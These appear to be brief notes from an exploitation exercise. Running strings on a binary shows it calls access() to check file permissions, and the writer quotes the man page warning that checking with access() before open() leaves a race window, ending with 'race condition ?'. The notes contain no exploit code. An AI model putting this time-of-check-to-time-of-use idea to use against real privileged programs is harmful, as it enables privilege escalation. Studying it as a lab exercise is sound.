from strings cmd  --> access to check the file permissions

can't symlink exploit because " If pathname is a symbolic link, it is dereferenced." *man*

BUT : (from man as well)
NOTES
       Warning:  Using  access()  to  check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the
       short time interval between checking and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.

race condition ?
